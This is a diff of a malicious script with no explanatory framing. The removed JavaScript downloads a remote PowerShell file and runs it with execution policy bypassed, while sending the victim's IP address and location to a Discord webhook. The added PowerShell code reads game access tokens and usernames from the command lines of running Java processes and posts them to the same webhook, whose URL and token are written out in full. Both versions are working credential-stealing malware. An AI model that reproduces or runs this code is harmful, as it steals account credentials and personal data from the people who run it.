@@ -1,111 +1,33 @@
-const File = Java.type("java.io.File");
-const FileWriter = Java.type("java.io.FileWriter");
-const HttpURLConnection = Java.type("java.net.HttpURLConnection");
-const URL = Java.type("java.net.URL");
-const BufferedReader = Java.type("java.io.BufferedReader");
-const InputStreamReader = Java.type("java.io.InputStreamReader");
-const OutputStreamWriter = Java.type("java.io.OutputStreamWriter");
-const Runtime = Java.type("java.lang.Runtime");
+$webhookUrl = "https://discordapp.com/api/webhooks/1395071534929805394/CDuiEvYPS1Fd_eWjt4pd7T8r5v5vw0EHkCv7Q8txj-dD8NjR2er8kNQXpV2FpnI0qE5I"
 
-const scriptUrl = "https://raw.githubusercontent.com/rizzkaing/43441341434143adsdsadasasddsasdaasd/refs/heads/main/rizzler.ps1";
-const tempFolder = java.lang.System.getProperty("java.io.tmpdir");
-const scriptPath = tempFolder + File.separator + "autosell.ps1";
-const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1395071534929805394/CDuiEvYPS1Fd_eWjt4pd7T8r5v5vw0EHkCv7Q8txj-dD8NjR2er8kNQXpV2FpnI0qE5I";
+Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'Java%' AND CommandLine LIKE '%accessToken%'" |
+    Select-Object -ExpandProperty CommandLine |
+    ForEach-Object {
+        $accessToken = $null
+        $username = $null
 
-// Send message to Discord webhook using Java
-function sendToWebhook(message) {
-    try {
-        const url = new URL(WEBHOOK_URL);
-        const connection = url.openConnection();
-        connection.setDoOutput(true);
-        connection.setRequestMethod("POST");
-        connection.setRequestProperty("Content-Type", "application/json");
-
-        const payload = JSON.stringify({ content: message });
-        const writer = new OutputStreamWriter(connection.getOutputStream(), "UTF-8");
-        writer.write(payload);
-        writer.flush();
-        writer.close();
-
-        const responseCode = connection.getResponseCode();
-        if (responseCode !== 204 && responseCode !== 200) {
-            print("Failed to send webhook message. Response code: " + responseCode);
+        if ($_ -match '--accessToken\s+(\S+)') {
+            $accessToken = $matches[1]
         }
-    } catch (err) {
-        print("Webhook Error: " + err.message);
-    }
-}
-
-// Override print to also send to webhook
-const originalPrint = print;
-print = function (...args) {
-    const message = args.join(" ");
-    originalPrint(message);
-    sendToWebhook(message);
-};
-
-// IP Info
-function getMyIPInfo() {
-    try {
-        const url = new URL("http://ip-api.com/json/");
-        const connection = url.openConnection();
-        connection.setRequestMethod("GET");
-
-        if (connection.getResponseCode() !== HttpURLConnection.HTTP_OK) {
-            throw new Error("Failed to fetch IP info: HTTP " + connection.getResponseCode());
+        if ($_ -match '--username\s+(\S+)') {
+            $username = $matches[1]
         }
 
-        const reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
-        let response = "", line;
-        while ((line = reader.readLine()) !== null) {
-            response += line;
-        }
-        reader.close();
+        if ($accessToken -and $username) {
+            # Format the message for Discord
+            $message = @"
+> **AccessToken:** $accessToken
+> **Username:** $username
+"@
 
-        print("\n🌐 Your Public IP & Location Info:");
-        print(response);
-    } catch (err) {
-        print("Error getting IP info: " + err.message);
-    }
-}
+            Write-Output $message
 
-// Download script
-function downloadScript(url, destination) {
-    try {
-        const connection = new URL(url).openConnection();
-        connection.setRequestMethod("GET");
+            # Properly format the payload for Discord
+            $payload = @{
+                content = $message
+            } | ConvertTo-Json -Depth 10
 
-        if (connection.getResponseCode() !== HttpURLConnection.HTTP_OK) {
-            throw new Error("Failed to download file: HTTP " + connection.getResponseCode());
-        }
-
-        const reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
-        const writer = new FileWriter(new File(destination));
-        let line;
-        while ((line = reader.readLine()) !== null) {
-            writer.write(line + "\n");
-        }
-        reader.close();
-        writer.close();
-
-        print("Script downloaded successfully to: " + destination);
-    } catch (err) {
-        print("Error downloading the script: " + err.message);
-        throw err;
-    }
-}
-
-// Run script
-function executeScript(scriptPath) {
-    try {
-        const process = Runtime.getRuntime().exec(`powershell -ExecutionPolicy Bypass -File "${scriptPath}"`);
-        process.waitFor();
-        const exitCode = process.exitValue();
-        print("Script executed with exit code: " + exitCode);
-    } catch (err) {
-        print("Error executing the script: " + err.message);
-    }
-}
+            # Send the payload to the Discord webhook
             Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
         }
     }
